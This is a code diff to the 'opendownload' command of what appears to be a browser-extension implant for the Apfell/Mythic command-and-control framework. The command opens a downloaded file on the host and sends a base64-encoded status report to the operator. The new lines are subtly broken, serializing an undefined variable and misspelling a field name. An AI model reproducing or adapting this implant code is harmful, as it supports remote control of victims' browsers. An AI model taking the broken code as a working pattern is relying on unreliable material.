@@ -1,5 +1,5 @@
-opendownload = function(params) {
-    let args = JSON.parse(atob(params['data'].toString()));
+opendownload = function(task) {
+    let args = JSON.parse(atob(task['params'].toString()));
     const id = Math.round(args["downloadid"]);
     let icon = chrome.extension.getURL(args["iconURL"]);
     let message = args["message"];
@@ -13,13 +13,12 @@ opendownload = function(params) {
         chrome.notifications.onButtonClicked.addListener(function(notificationIDa, bIndex) {
             if(notificationID === notificationIDa) {
                 chrome.downloads.open(id);
-                const opened = btoa(unescape(encodeURIComponent(JSON.stringify({'status': 'opened download with ID: ' + id}, null, 2))));
-                const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, started.length, taskid, tasktype, opened);
-                let meta = {};
-                meta["metatype"] = 3;
-                meta["metadata"] = apfellmsg;
-                const metaenvelope = JSON.stringify(meta);
-                out.push(metaenvelope);
+                response = {'task_id':task['task_id'], 'completed': true, 'user_output': 'opened download with ID: ' + id};
+                out_response = {'action':'post_response', 'reponses':[response], 'delegates':[]};
+                enc = JSON.stringify(outer_response);
+                final = apfell.apfellid + enc;
+                msg = btoa(unescape(encodeURIComponent(final)));
+                out.push(msg);
             }
         });
     });
